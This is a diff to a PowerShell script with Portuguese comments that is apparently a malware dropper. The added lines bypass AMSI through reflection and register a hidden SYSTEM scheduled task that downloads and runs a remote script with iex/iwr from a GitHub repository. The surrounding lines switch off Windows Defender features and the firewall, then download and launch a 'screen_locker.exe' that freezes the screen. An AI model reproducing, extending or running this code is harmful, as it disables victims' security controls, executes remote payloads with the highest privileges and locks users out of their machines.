@@ -1,3 +1,9 @@
+# ---------- AMSI Bypass (método do artigo) ----------
+$a = 'System.Management.Automation.A'; $b = 'msiUtils'
+$c = [Ref].Assembly.GetType($a+$b)
+$d = $c.GetField('amsiInitFailed','NonPublic,Static')
+$d.SetValue($null,$true)
+
 # ---------- Desativações ----------
 Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
 Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
@@ -10,8 +16,14 @@ netsh advfirewall set allprofiles state off
 $handshakeFile = "$env:TEMP\handshake_restore.txt"
 "restore_pending" | Out-File -FilePath $handshakeFile -Force
 
+# ---------- Agendar restauração automática (30 segundos) ----------
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (iwr 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/enable_all.ps1' -UseBasicParsing).Content`""
+$trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddSeconds(30))
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "RestoreDefenses" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+
 # ---------- Baixar e executar o screen locker ----------
 $lockerUrl = "https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/screen_locker.exe"
 $lockerPath = "$env:TEMP\screen_locker.exe"
 (New-Object Net.WebClient).DownloadFile($lockerUrl, $lockerPath)
-Start-Process $lockerPath   # executa e trava a tela (30s padrão, mas pode ser ajustado)
+Start-Process $lockerPath   # congela a tela
